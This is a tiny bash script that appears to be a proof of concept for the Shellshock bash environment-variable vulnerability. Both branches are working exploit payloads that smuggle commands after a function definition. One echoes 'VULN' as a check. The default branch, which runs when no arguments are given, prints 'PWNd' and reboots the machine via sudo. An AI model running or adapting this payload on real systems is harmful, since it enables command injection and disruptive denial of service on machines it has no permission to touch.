#!/bin/bash
# Author: Bailey Kasin

if [ $# -eq 0 ]; then
    x='() { :;}; echo "PWNd" && /usr/bin/sudo reboot' bash -c :
else
  x='() { :;}; echo VULN' bash -c :
fi